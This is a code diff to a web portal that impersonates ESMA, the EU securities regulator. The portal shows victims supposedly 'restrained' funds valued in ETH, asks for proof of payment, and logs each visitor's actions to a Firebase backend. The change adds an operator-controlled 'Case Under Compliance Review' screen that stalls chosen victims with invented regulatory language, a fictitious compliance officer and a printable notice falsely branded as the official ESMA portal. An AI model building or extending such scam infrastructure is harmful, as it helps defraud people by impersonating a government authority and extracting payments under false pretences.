@@ -250,6 +250,31 @@ input[type="text"], input[type="email"], select {
   line-height: 1.6; 
 }
 
+/* CASE UNDER REVIEW BOX STYLING */
+.review-warning-box {
+  background: #fffbeb;
+  border: 1px solid #fde68a;
+  border-left: 5px solid var(--warning);
+  padding: 22px;
+  border-radius: 4px;
+  margin-bottom: 25px;
+}
+
+.review-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: #fef3c7;
+  color: #92400e;
+  font-weight: 700;
+  font-size: 12px;
+  padding: 4px 10px;
+  border-radius: 3px;
+  margin-bottom: 15px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
 .guarantee-calc-box { 
   background: #fff; 
   border: 2px solid var(--eu-blue); 
@@ -487,7 +512,7 @@ input[type="text"], input[type="email"], select {
   header { border-bottom: 2px solid var(--eu-blue); padding-bottom: 20px; }
   a[href]:after { content: none !important; }
 
-  #phase3 .print-footer, #phase5 .print-footer {
+  #phase3 .print-footer, #phase5 .print-footer, #phaseReview .print-footer {
     display: block !important;
     position: fixed;
     bottom: 0;
@@ -563,6 +588,44 @@ input[type="text"], input[type="email"], select {
 <div class="spinner"></div>
 <h3 data-i18n="p2Title">Querying Central Registry</h3>
 <p data-i18n="p2Wait">Please wait...</p>
+</div>
+</div>
+
+<!-- PHASE REVIEW: CASE UNDER REVIEW -->
+<div id="phaseReview" class="phase">
+<div class="review-warning-box">
+  <div class="review-badge">
+    <i class="fas fa-search-dollar"></i> <span data-i18n="reviewStatusBadge">STATUS: CASE UNDER COMPLIANCE REVIEW</span>
+  </div>
+  <h3 style="margin:0 0 10px 0; color:#92400e;" data-i18n="reviewTitle">Administrative Verification Pending</h3>
+  <p style="font-size: 14px; color: #78350f; margin: 0; line-height: 1.6;" data-i18n="reviewDesc">
+    Your file is currently undergoing additional regulatory review by the ESMA Financial Oversight Division. Direct portal progression is temporarily paused while compliance assessments are conducted.
+  </p>
+</div>
+
+<h4 style="border-bottom: 1px solid var(--border); padding-bottom: 10px;" data-i18n="reviewDetailsTitle">Beneficiary Profile Record</h4>
+<table class="official-table">
+<tr><td data-i18n="tblName">Full Legal Name:</td><td><strong id="revName">---</strong></td></tr>
+<tr><td data-i18n="tblRef">Registry Reference:</td><td><strong id="revRef">---</strong></td></tr>
+<tr><td data-i18n="tblDate">Date of Asset Restraint:</td><td><strong id="revDate">---</strong></td></tr>
+<tr><td data-i18n="tblAuth">Regulatory Authority:</td><td><strong>ESMA - European Securities and Markets Authority</strong></td></tr>
+<tr><td data-i18n="tblJurisdiction">Jurisdiction:</td><td><strong>EEA / Switzerland Hub</strong></td></tr>
+</table>
+
+<div style="background:#f8fafc; border:1px solid var(--border); padding:20px; border-radius:4px; margin-bottom:25px;">
+  <h4 style="margin:0 0 8px 0; color:var(--eu-blue);" data-i18n="reviewNoticeHeader"><i class="fas fa-info-circle"></i> Next Steps & Documentation Requirements</h4>
+  <p style="font-size:13px; color:var(--text-dark); margin:0 0 10px 0; line-height:1.6;" data-i18n="reviewNoticeBody">
+    During this review period, you are required to await formal evaluation results. Additional documentation or proof of trading history may be requested directly by your dedicated Financial Compliance Officer.
+  </p>
+  <p style="font-size:12px; color:var(--text-muted); margin:0;" data-i18n="reviewNoticeSub">
+    Please monitor your registered email account for official correspondence from the regulatory compliance team.
+  </p>
+</div>
+
+<button class="btn-eu btn-outline" onclick="window.print()" data-i18n="btnPrintReview"><i class="fas fa-file-pdf"></i> DOWNLOAD / PRINT CASE REVIEW NOTICE (PDF)</button>
+
+<div class="print-footer">
+Official European Securities and Markets Authority Portal — <strong>https://www.esma.europa.eu/</strong>
 </div>
 </div>
 
@@ -801,7 +864,7 @@ Please submit your <strong>Proof of Payment</strong> (Transaction Hash / Receipt
   </div>
 </footer>
 
-<!-- FIREBASE COMPATIBLE SDKs WITH YOUR EXACT ESMA-ASSETS CONFIG -->
+<!-- FIREBASE SDKs -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
@@ -869,7 +932,11 @@ function initPortal() {
         currentClient = doc.data();
         populateClientData();
         trackClientActivity(paramPhase || 1, "Direct Client Session Entry");
-        if (paramPhase) showPhase(parseInt(paramPhase));
+        if (currentClient.caseUnderReview) {
+          showPhase('Review');
+        } else if (paramPhase) {
+          showPhase(parseInt(paramPhase));
+        }
       }
     });
   } else {
@@ -909,6 +976,14 @@ phEmail: "Enter email address",
 btnSearch: "SEARCH ESMA REGISTRY",
 p2Title: "Querying Central Registry",
 p2Wait: "Please wait...",
+reviewStatusBadge: "STATUS: CASE UNDER COMPLIANCE REVIEW",
+reviewTitle: "Administrative Verification Pending",
+reviewDesc: "Your file is currently undergoing additional regulatory review by the ESMA Financial Oversight Division. Direct portal progression is temporarily paused while compliance assessments are conducted.",
+reviewDetailsTitle: "Beneficiary Profile Record",
+reviewNoticeHeader: "Next Steps & Documentation Requirements",
+reviewNoticeBody: "During this review period, you are required to await formal evaluation results. Additional documentation or proof of trading history may be requested directly by your dedicated Financial Compliance Officer.",
+reviewNoticeSub: "Please monitor your registered email account for official correspondence from the regulatory compliance team.",
+btnPrintReview: "DOWNLOAD / PRINT CASE REVIEW NOTICE (PDF)",
 p3Header: "TOTAL RESTRAINED CAPITAL",
 p3Status: "STATUS: ADMINISTRATIVE RESTRAINT",
 p3DetailsTitle: "Beneficiary Details",
@@ -1001,7 +1076,7 @@ function changeLanguage(lang) {
 
 function showPhase(n){
   document.querySelectorAll('.phase').forEach(p=>p.classList.remove('active'));
-  document.getElementById('phase'+n).classList.add('active');
+  document.getElementById('phase' + n).classList.add('active');
   window.scrollTo(0,0);
   trackClientActivity(n, `Navigated to Phase ${n}`);
 }
@@ -1035,7 +1110,16 @@ async function validateUser(){
     trackClientActivity(1, "Successful Client Login Search");
 
     showPhase(2);
-    setTimeout(()=>showPhase(3), 4000);
+
+    // BLOCK PHASE 3 IF "CASE UNDER REVIEW" IS CHECKED
+    setTimeout(() => {
+      if (currentClient.caseUnderReview === true) {
+        showPhase('Review');
+      } else {
+        showPhase(3);
+      }
+    }, 2500);
+
   } catch (err) {
     alert("Error fetching client details.");
   }
@@ -1083,6 +1167,15 @@ function populateClientData() {
   const rate = exchangeRates[currentClient.currency] || 2300;
   const approxEth = (currentClient.restrainedAmount / rate).toFixed(2);
 
+  // Review Phase Data
+  const revName = document.getElementById('revName');
+  const revRef = document.getElementById('revRef');
+  const revDate = document.getElementById('revDate');
+  if (revName) revName.innerText = currentClient.name;
+  if (revRef) revRef.innerText = currentClient.ref || "EU-MICA-8829123-00";
+  if (revDate) revDate.innerText = currentClient.date;
+
+  // Phase 3 Data
   document.getElementById('p3Amount').innerText = formatCurrency(currentClient.restrainedAmount, symbol) + " " + currentClient.currency;
   document.getElementById('p3EthSub').innerText = "≈ " + approxEth + " ETH";
   document.getElementById('p3Name').innerText = currentClient.name;
